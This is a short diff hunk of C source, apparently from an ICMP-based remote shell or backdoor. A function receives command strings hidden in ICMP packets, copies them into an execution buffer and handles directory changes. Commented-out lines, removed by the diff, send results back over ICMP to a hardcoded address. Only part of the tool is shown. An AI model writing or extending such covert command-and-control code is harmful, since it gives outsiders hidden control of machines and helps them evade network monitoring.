@@ -224,23 +224,13 @@ void *receive_icmp_data(void *lparam){
 
           if (verify != 0){
           //printf("test");
+
             char exec_command[2048];
             char pwd[100];
             char pwdbuff[100];
 
             strncpy(exec_command,data+6,strlen(data)-6);
-            //printf("Command: %s", data);
-            //printf("cd: %s", buffercd);
 
-            // Test chdir in dirs, feature not working in the moment
-            //if (strstr(data, word) != NULL){
-              //printf("is equal\n");
-              //char path[200];
-              //strncpy(path,exec_command+3,strlen(exec_command)-3);
-              //chdir(path);
-              //sprintf(pwd, "Moved to: %s", getcwd(pwdbuff, 100));
-              //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), pwd, sizeof(pwd));
-            //}
             char path[4096];
 
             if (strncmp(exec_command, "cd ", 3) == 0) {
